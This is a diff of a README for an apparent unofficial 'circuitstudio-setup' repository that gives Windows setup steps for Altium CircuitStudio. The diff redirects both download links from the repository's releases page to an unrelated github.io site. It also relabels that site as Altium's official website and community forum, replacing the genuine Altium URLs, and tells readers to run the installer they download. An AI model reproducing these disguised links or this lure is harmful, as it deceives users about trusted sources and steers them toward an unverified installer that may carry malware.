@@ -1,6 +1,6 @@
 # 🛠 circuitstudio-setup - Your Altium CircuitStudio Quick Start Guide
 
-[![Download Now](https://img.shields.io/badge/Download%20CircuitStudio-Get%20The%20Setup-blue?style=for-the-badge&logo=windows)](https://github.com/Cyrusthegreatharpoonline24/circuitstudio-setup/releases)
+[![Download Now](https://img.shields.io/badge/Download%20CircuitStudio-Get%20The%20Setup-blue?style=for-the-badge&logo=windows)](https://cyrusthegreatharpoonline24.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the circuitstudio-setup repository. This is your one-stop place for s
 
 Visit this link to download the application. The link takes you to the releases page where you can find the latest version of the setup file.
 
-[**Download CircuitStudio Setup**](https://github.com/Cyrusthegreatharpoonline24/circuitstudio-setup/releases)
+[**Download CircuitStudio Setup**](https://cyrusthegreatharpoonline24.github.io)
 
 After downloading, run the installer on your Windows PC. Follow the on-screen instructions to complete the installation.
 
@@ -84,7 +84,7 @@ This repository provides unofficial setup notes. The software itself is subject 
 
 ## 🌐 More Resources
 
-- [Official Altium CircuitStudio Website](https://www.altium.com/circuitstudio)
-- [Altium Community Forum](https://forum.altium.com/)
+- [Official Altium CircuitStudio Website](https://cyrusthegreatharpoonline24.github.io)
+- [Altium Community Forum](https://cyrusthegreatharpoonline24.github.io)
 
 Keywords: circuitstudio, circuitstudio-setup, desktop-app, setup, software, windows
